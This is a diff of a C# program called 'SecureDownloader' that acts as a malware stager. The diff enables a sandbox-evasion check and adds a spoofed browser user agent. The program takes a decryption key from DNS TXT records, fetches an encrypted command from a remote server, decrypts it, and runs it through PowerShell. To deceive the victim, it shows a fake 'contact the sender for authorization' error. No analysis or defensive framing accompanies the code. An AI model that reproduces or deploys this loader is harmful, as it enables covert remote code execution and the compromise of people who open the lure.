@@ -1,9 +1,7 @@
 ﻿using System;
 using System.IO;
-using System.Resources;
 using System.Collections.Generic;
 using System.Security.Cryptography;
-using System.Linq;
 using System.Text;
 using System.Net;
 using Microsoft.Win32;
@@ -12,6 +10,7 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Diagnostics;
 using System.Text.RegularExpressions;
+using System.Windows.Forms;
 
 namespace SecureDownloader {
     class SandboxCheck {
@@ -175,6 +174,7 @@ namespace SecureDownloader {
             //proxy aware
             client.UseDefaultCredentials = true;
             client.Proxy = WebRequest.GetSystemWebProxy();
+            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
 
             Stream data = client.OpenRead(URI);
             StreamReader reader = new StreamReader(data);
@@ -188,7 +188,7 @@ namespace SecureDownloader {
 
     class Program {
         static void Main() {
-            //SandboxCheck.izSafe();
+            SandboxCheck.izSafe();
 
             byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("fda7hk2.concordiafunds.com")[0]);
             //string data;
@@ -203,13 +203,14 @@ namespace SecureDownloader {
             //}
             //Environment.Exit(0);
 
-            string data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf");
+            string data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf2");
 
             byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
             byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);
 
             string cmd = HelperFunctions.decrypt(encryptedCmd, key, iv);
-            string decodedCmd = System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
+            string decodedCmd = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
+            MessageBox.Show("Please contact the sender of the document for authorization.", "An error occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
             FunStuff.DoFunStuff(decodedCmd);
         }
     }
